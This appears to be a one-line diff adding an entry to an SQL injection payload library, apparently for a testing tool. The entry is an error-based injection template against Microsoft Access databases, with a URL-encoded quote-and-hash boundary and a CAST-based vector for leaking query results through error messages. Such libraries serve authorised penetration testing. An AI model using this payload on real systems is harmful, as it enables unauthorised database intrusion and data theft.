@@ -1,0 +1,1 @@
+{"dbms": "access", "technique": "error", "boundary": {"prefix": "'%23", "suffix": "", "type": "single-enc-hash"}, "vector": "{B} AND 1=(SELECT CAST(({Q}) AS INT))", "comment": "access error: single+enc hash"}
